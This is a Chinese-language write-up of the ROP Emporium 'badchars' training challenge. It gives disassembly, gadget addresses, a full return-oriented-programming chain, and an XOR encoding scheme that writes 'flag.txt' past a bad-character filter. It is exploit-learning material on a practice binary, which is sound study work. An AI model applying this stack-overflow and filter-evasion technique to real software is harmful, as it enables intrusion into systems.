# 32 ROP Emporium `badchars` 速通笔记

```text
64 位 ELF、No PIE、NX、无 canary、Partial RELRO、not stripped
pwnme / print_file 在配套 libbadchars.so 里（RUNPATH = b'.'）
坏字符：'x' 'g' 'a' '.'（pwnme 把 read 进来的每个字节与这张表比对，命中就改成 0xeb）
```

## 1. 为什么单独成类（和 31 write4 的差别）

31 只要求"能把字符串写进可写段"；本题在此之上多了一条硬约束：
**payload 的每一个字节都不能是 `x` / `g` / `a` / `.`**。
而 `"flag.txt"` 本身就含 `g`、`a`、`.`，`"/bin/sh"` 含 `a`、`.`（`.` 是 0x2e，
很多低地址的**中间字节**也会撞上，这是本题最容易翻车的地方）。

因此需要"**写密文 → 原地解密 → 再用**"两段式，属于独立原语：
**编码规避（encoder）**。

反汇编证据（`libbadchars.so::pwnme`，0x99a 起是过滤循环）：

```text
 99a:  mov  QWORD PTR [rbp-0x30],0x0        ; j = 0
 9a4:  mov  rax,[rbp-0x38]                  ; i
 9a8:  movzx ecx,BYTE PTR [rbp+rax*1-0x20]  ; buf[i]
 9b1:  mov  rdx,[rip+...]                   ; &badcharacters
 9b8:  movzx eax,BYTE PTR [rdx+rax*1]       ; badcharacters[j]
 9bc:  cmp  cl,al
 9be:  jne  9c9
 9c0:  mov  BYTE PTR [rbp+rax*1-0x20],0xeb  ; buf[i] = 0xeb   <-- 命中即毁
```

`badcharacters` 只有 4 个字节（`78 67 61 2e` = `x g a .`），
所以"改一个字节让它躲开"没有意义——被命中就变成 `0xeb`，链直接断。

## 2. gadget 与可写目标

| 地址 | gadget | 备注 |
| --- | --- | --- |
| `0x40069c` | `pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret` | 一次设 4 个寄存器 |
| `0x400634` | `mov qword ptr [r13], r12 ; ret` | 写 8 字节 |
| `0x4006a0` | `pop r14 ; pop r15 ; ret` | 解密循环里用（比 4-pop 版省 16 B/次） |
| `0x400628` | `xor byte ptr [r15], r14b ; ret` | 单字节解密 |
| `0x4006a3` | `pop rdi ; ret` | |
| `0x400510` | `print_file@plt` | |

`usefulGadgets` 里还有 `add [r15], r14b` / `sub [r15], r14b`，
所以 key 不限于 XOR，加/减同样能构造编码。

段布局与 31 相同（`.data` 0x601028–0x601037，`.bss` 0x601038–0x60103f，heap 从 0x601040 起）。

> **关键细节：目标地址不能是 `0x601028`。**
> 逐字节解密时要访问 `DATA + i`，`i = 6` 时地址是 `0x60102e`，低字节 **0x2e 就是 `.`**，
> 这个地址一旦出现在 payload 里就会被改成 `0xeb`。
> 改用 `0x601030`：`0x601030..0x601037` 是 `.data` 后 8 字节，且 `0x601038`（`.bss`）
> 天然为 0，正好当结束符，也不会碰 heap。
> 这类"**地址字节撞坏字符**"是 badchars 题最典型的翻车点，EXP 里用
> `assert not set(payload) & BAD` 做自检。

## 3. 利用链（368 B，`read` 上限 0x200 = 512 B）

```text
'A' * 40                                    # read(0, rbp-0x20, 0x200)
pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret # 0x40069c
  "dnce,vzv"                                #   r12 = "flag.txt" ^ 2（小端 8 字节）
  0x601030                                  #   r13 = 目标
  2                                         #   r14 = key
  0                                         #   r15 = 占位
mov [r13], r12 ; ret                        # 0x400634  写入密文
# 循环 8 次（i = 0..7）：
pop r14 ; pop r15 ; ret                     # 0x4006a0
  2
  0x601030 + i
xor byte ptr [r15], r14b ; ret              # 0x400628  原地解密
pop rdi ; ret                               # 0x4006a3
  0x601030
print_file@plt                              # 0x400510  print_file("flag.txt")
```

长度账：`40 + (6*8+8) + 8*(2*8+8) + (2*8) + 8 = 368`。
如果解密循环也用 4-pop 的 `pop r12..r15`，会变成 `40 + 56 + 8*56 + 24 = 568`，
**超过 512 的 read 上限**——这是本题的第二个坑（不是链写错，是长度爆了）。

## 4. 编码方案怎么选

```python
enc = bytes(c ^ 2 for c in b"flag.txt")   # b'dnce,vzv'
set(enc) & set(b"xga.")                   # set() -> 空
```

选 key 的判定标准（三条全满足）：
1. 密文本身不含坏字符；
2. 链里所有 gadget 地址、栈上的常量（key、0 填充、`.data` 地址）不含坏字符；
3. 解密时访问的每个 `DATA + i` 地址不含坏字符。

key = 2 恰好满足（`0x601030..0x601037` 的地址字节是 `0x30..0x37`、`0x60`、`0x10`）。
换 key 或换目标地址后必须重新验一遍，EXP 的 `assert` 就是干这个的。

## 5. 本地复现

```bash
cd '/home/yfhd5/Pwn_Writeups/badchars_encoding'
source ../.venv/bin/activate
python 32_ropemporium_badchars_exp.py LOCAL
# Thank you!
# ROPE{a_placeholder_32byte_flag!}
```

远程用 `HOST=... PORT=... python 32_ropemporium_badchars_exp.py`（官方无公开靶机）。

附件来源：`https://ropemporium.com/binary/badchars.zip`（zip sha256 `f6e8d54c…`），
原始 zip 备份在 `_vendor/ropemporium/badchars.zip`，清单见 `_vendor/attach_manifest.md`。

## 6. 识别卡

```text
程序把输入逐字节和一张坏字符表比对（命中就改成 0xeb / 拒绝）
+ 需要的字符串里正好含坏字符
  -> 写密文 + 原地解码（xor/add/sub byte ptr [reg], regb）
三个自检：密文、gadget 地址、目标地址（含 DATA+i 的每个字节）都不能含坏字符
长度预算先算：read 上限是硬约束，解密循环优先用 2-pop 的 gadget
```
